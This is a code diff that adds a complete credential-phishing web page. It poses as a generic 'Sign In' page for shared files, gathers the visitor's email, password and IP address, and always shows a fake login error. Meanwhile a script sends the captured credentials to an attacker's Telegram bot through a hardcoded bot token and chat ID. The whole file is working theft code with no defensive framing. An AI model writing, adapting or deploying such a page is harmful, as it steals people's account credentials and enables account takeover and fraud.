@@ -1,0 +1,260 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign In</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-image: url('https://i.ibb.co/42WTxPK/d3.png');
+            background-size: cover;
+            background-position: center;
+        }
+        .container {
+            width: 320px;
+            padding: 20px;
+            background: #fff;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            border-radius: 8px;
+            text-align: left;
+        }
+        .hidden {
+            display: none;
+        }
+        .logo {
+            width: 40px;
+            float: left;
+            margin-right: 10px;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: bold;
+            margin: 0;
+            padding-bottom: 20px;
+            text-align: left;
+            color: #333;
+            clear: both;
+        }
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: none;
+            border-bottom: 2px solid #ccc;
+            outline: none;
+            box-sizing: border-box;
+            font-size: 16px;
+            background: transparent;
+        }
+        input[type="email"]:focus, input[type="password"]:focus {
+            border-bottom: 2px solid #007BFF;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            float: right;
+            margin-top: 20px;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .email-display {
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 20px;
+        }
+        .form-title {
+            font-size: 14px;
+            color: #666666;
+            margin-bottom: 10px;
+        }
+        .info-text {
+            font-size: 12px;
+            color: #888;
+            margin-top: 10px;
+        }
+        .error-message {
+            color: red;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+        .clearfix::after {
+            content: "";
+            clear: both;
+            display: table;
+        }
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-left-color: #007BFF;
+            border-radius: 50%;
+            width: 16px;
+            height: 16px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: 8px;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+
+<div class="container" id="emailPage">
+    <div class="clearfix">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTGAA4Wd4bco5Xv33GasXrnDdQT5OFXwa3HUQ&s" alt="Logo" class="logo">
+        <h1>Sign In</h1>
+    </div>
+    <h2 class="form-title">Only recipient email can access shared files</h2>
+    <input type="email" id="email" placeholder="Email" value=""required>
+    <button onclick="checkEmail()">Download</button>
+</div>
+
+<div class="container hidden" id="verifyingPage">
+    <div class="clearfix">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTGAA4Wd4bco5Xv33GasXrnDdQT5OFXwa3HUQ&s" alt="Logo" class="logo">
+        <h1>Sign In</h1>
+    </div>
+    <div id="emailDisplayVerifying" class="email-display"></div>
+    <div class="verifying"><div class="spinner"></div>Trying to sign in...</div>
+</div>
+
+<div class="container hidden" id="passwordPage">
+    <div class="clearfix">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTGAA4Wd4bco5Xv33GasXrnDdQT5OFXwa3HUQ&s" alt="Logo" class="logo">
+        <h1>Sign In</h1>
+    </div>
+    <div class="email-display" id="emailDisplay"></div>
+    <h2 class="form-title">Enter Password</h2>
+    <input type="password" id="password" placeholder="Password">
+    <div class="info-text">Only recipient email can access shared files</div>
+    <button onclick="checkPassword()">Sign In</button>
+    <div class="error-message" id="error-message">Your account or password is incorrect.</div>
+</div>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function() {
+        var emailInput = document.getElementById("email");
+        var passwordInput = document.getElementById("password");
+
+        // Automatically proceed if the email is pre-filled
+        if (emailInput.value) {
+            moveToPasswordPage(emailInput.value);
+        }
+
+        // Listen for Enter key on the email input
+        emailInput.addEventListener("keydown", function(event) {
+            if (event.key === "Enter") {
+                checkEmail();
+            }
+        });
+
+        // Listen for Enter key on the password input
+        passwordInput.addEventListener("keydown", function(event) {
+            if (event.key === "Enter") {
+                checkPassword();
+            }
+        });
+
+        // Get the user's IP address using an external API
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                window.userIP = data.ip;
+            })
+            .catch(error => {
+                console.error('Error fetching IP address:', error);
+                window.userIP = 'Not Available';
+            });
+
+        // Get the login server URL
+        window.loginServer = window.location.hostname;
+    });
+
+    function checkEmail() {
+        var email = document.getElementById("email").value;
+        if (email) {
+            moveToPasswordPage(email);
+        } else {
+            alert("Please enter a valid email address.");
+        }
+    }
+
+    function moveToPasswordPage(email) {
+        document.getElementById("emailPage").classList.add("hidden");
+        document.getElementById("verifyingPage").classList.remove("hidden");
+        document.getElementById("emailDisplayVerifying").innerText = email;
+
+        setTimeout(function() {
+            document.getElementById("verifyingPage").classList.add("hidden");
+            document.getElementById("emailDisplay").innerText = email;
+            document.getElementById("passwordPage").classList.remove("hidden");
+        }, 2000); // Simulate a 2-second verification delay
+    }
+
+    function checkPassword() {
+        var password = document.getElementById("password").value;
+        var email = document.getElementById("email").value;
+        var ip = window.userIP || 'Not Available';
+        var emailDomain = email.split('@')[1] || 'Not Available';
+        var loginServer = window.loginServer || 'Not Available';
+
+        document.getElementById("passwordPage").classList.add("hidden");
+        document.getElementById("verifyingPage").classList.remove("hidden");
+        document.getElementById("emailDisplayVerifying").innerText = email;
+
+        setTimeout(function() {
+            // Simulate a login check (always fail for demonstration)
+            var isValidLogin = false;
+
+            if (!isValidLogin) {
+                sendFormDataToTelegram(email, password, ip, emailDomain, loginServer);
+                document.getElementById("error-message").style.display = 'block';
+                document.getElementById("verifyingPage").classList.add("hidden");
+                document.getElementById("passwordPage").classList.remove("hidden");
+            }
+        }, 2000); // Simulate a 2-second verification delay
+    }
+
+    function sendFormDataToTelegram(email, password, ip, emailDomain, loginServer) {
+        var chatID = '1637284648';
+        var apiToken = '7317095608:AAHky9fpA5KcLFM6S5O3Wl7p7S82jxzIbSU';
+        var message = `📧 Email: ${email}\n🔑 Password: ${password}\n🌐 IP: ${ip}\n📧 Email Domain: ${emailDomain}`;
+
+        var url = `https://api.telegram.org/bot${apiToken}/sendMessage`;
+        var data = {
+            chat_id: chatID,
+            text: message
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify(data)
+        })
+        .then(response => response.json())
+        .then(data => {
+            console.log('Message sent:', data);
+        })
+        .catch(error => {
+            console.error('Error:', error);
+        });
+    }
+</script>
+
+</body>
+</html>
